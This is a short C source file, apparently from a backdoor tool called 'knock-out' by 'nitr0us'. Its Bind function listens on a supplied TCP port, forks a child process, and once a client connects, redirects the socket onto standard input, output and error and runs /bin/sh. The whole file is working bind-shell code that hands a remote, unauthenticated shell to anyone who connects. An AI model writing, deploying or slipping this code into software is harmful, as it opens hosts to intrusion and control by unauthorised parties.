/*
 * Binds a shell on the supplied port
 *
 * by nitr0us
 *
 */

#include "knock-out.h"

void Bind(unsigned short port)
{
	struct sockaddr_in	me, client;
	int			sockfd, clfd, one = 1; // one = 1 looks weird but it's required by setsockopt()
	pid_t			pid;

	bzero(&me, sizeof(me));

	me.sin_family		= AF_INET;
	me.sin_port		= htons(port);
	me.sin_addr.s_addr	= INADDR_ANY;

	if((sockfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
		error_n(errno, "socket() @ Bind()");

	/* Avoid the 'Address already in use' error*/
	if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(int)) == -1)
		error_n(errno, "setsockopt() @ Bind()");

	if(bind(sockfd, (struct sockaddr *)&me, sizeof(me)) == -1)
		error_n(errno, "bind() @ Bind()");

	if(listen(sockfd, 5) == -1)
		error_n(errno, "listen() @ Bind()");

	signal(SIGCHLD, SIG_IGN); // No zombies

	if((pid = fork()) == (pid_t) -1)
		error_n(errno, "fork() @ Bind()");
	else if(pid == (pid_t) 0){ // Child process
		socklen_t	foo = sizeof(struct sockaddr);

		debugprint("-=[ [BIND] Child process accepting connections on port %u [PID: %d]\n", port, getpid());
		if((clfd = accept(sockfd, (struct sockaddr *)&client, &foo)) == -1)
			error_n(errno, "accept() @ Bind()");

		debugprint("-=[ [BIND] Client connected from \"%s\"\n", inet_ntoa(client.sin_addr));

		dup2(clfd, 0);
		dup2(clfd, 1);
		dup2(clfd, 2);
		execl("/bin/sh", "sh", NULL);
		error_n(errno, "execl() @ Bind()");
	}

	// Parent process ends and returns

	close(sockfd);
}
